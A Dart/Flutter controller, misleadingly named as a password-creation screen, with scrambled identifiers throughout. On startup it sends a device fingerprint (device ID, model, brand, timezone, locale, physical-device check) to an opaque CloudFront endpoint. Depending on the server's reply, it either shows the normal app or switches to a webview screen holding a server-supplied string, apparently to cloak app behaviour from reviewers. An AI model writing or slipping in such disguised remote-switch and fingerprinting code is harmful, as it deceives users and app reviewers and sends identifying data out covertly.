import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:get/get.dart';
import 'package:flutter_timezone/flutter_timezone.dart';


class SvPasswordCreateLogic extends GetxController {

  var qxuscpma = RxBool(false);
  var olieskwayc = RxBool(true);
  var zolrct = RxString("");
  var ymdwjkxf = RxBool(false);
  var ycxfq = RxBool(true);
  final kewovny = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    tgrc();
  }


  Future<void> tgrc() async {
    ymdwjkxf.value = true;
    ycxfq.value = true;
    olieskwayc.value = false;

    kewovny.post("https://d2u3xlggwwcr3j.cloudfront.net/bcalykwtzfpdihqmeovjugrsxn",data: await ncmfqe()).then((value) {
      var nxiblcq = value.data["nxiblcq"] as String;
      var ubsqjwy = value.data["ubsqjwy"] as bool;
      if (ubsqjwy) {
        zolrct.value = nxiblcq;
        lgoitp();
      } else {
        iutpfd();
      }
    }).catchError((e) {
      olieskwayc.value = true;
      ycxfq.value = true;
      ymdwjkxf.value = false;
    });
  }

  Future<Map<String, dynamic>> ncmfqe() async {
    final DeviceInfoPlugin ibxtf = DeviceInfoPlugin();
    PackageInfo djselt_yvci = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var rjaqdoyb = Platform.localeName;
    var blhc = currentTimeZone;

    var yjhxa = djselt_yvci.packageName;
    var lahc = djselt_yvci.version;
    var tqcja = djselt_yvci.buildNumber;

    var hgqp = djselt_yvci.appName;
    var nlbezax = "";
    var nkcraz  = "";
    var xsyobqdc = "";
    var mxzhtquw = "";
    var erbymnq = "";
    var pkmj = "";
    var emdszq = "";
    var hfrnkl = "";


    var ckfnqywz = "";
    var ibmoxnv = false;

    if (GetPlatform.isAndroid) {
      ckfnqywz = "android";
      var pzfiqdte = await ibxtf.androidInfo;

      xsyobqdc = pzfiqdte.brand;

      nlbezax  = pzfiqdte.model;
      nkcraz = pzfiqdte.id;

      ibmoxnv = pzfiqdte.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ckfnqywz = "ios";
      var hlavsng = await ibxtf.iosInfo;
      xsyobqdc = hlavsng.name;
      nlbezax = hlavsng.model;

      nkcraz = hlavsng.identifierForVendor ?? "";
      ibmoxnv  = hlavsng.isPhysicalDevice;
    }
    var res = {
      "hgqp": hgqp,
      "lahc": lahc,
      "emdszq" : emdszq,
      "yjhxa": yjhxa,
      "nlbezax": nlbezax,
      "blhc": blhc,
      "xsyobqdc": xsyobqdc,
      "nkcraz": nkcraz,
      "tqcja": tqcja,
      "ckfnqywz": ckfnqywz,
      "ibmoxnv": ibmoxnv,
      "mxzhtquw" : mxzhtquw,
      "rjaqdoyb": rjaqdoyb,
      "erbymnq" : erbymnq,
      "pkmj" : pkmj,
      "hfrnkl" : hfrnkl,

    };
    return res;
  }

  Future<void> iutpfd() async {
    Get.offNamed("/tab");
  }

  Future<void> lgoitp() async {
    Get.offNamed("/soundrule");
  }

}
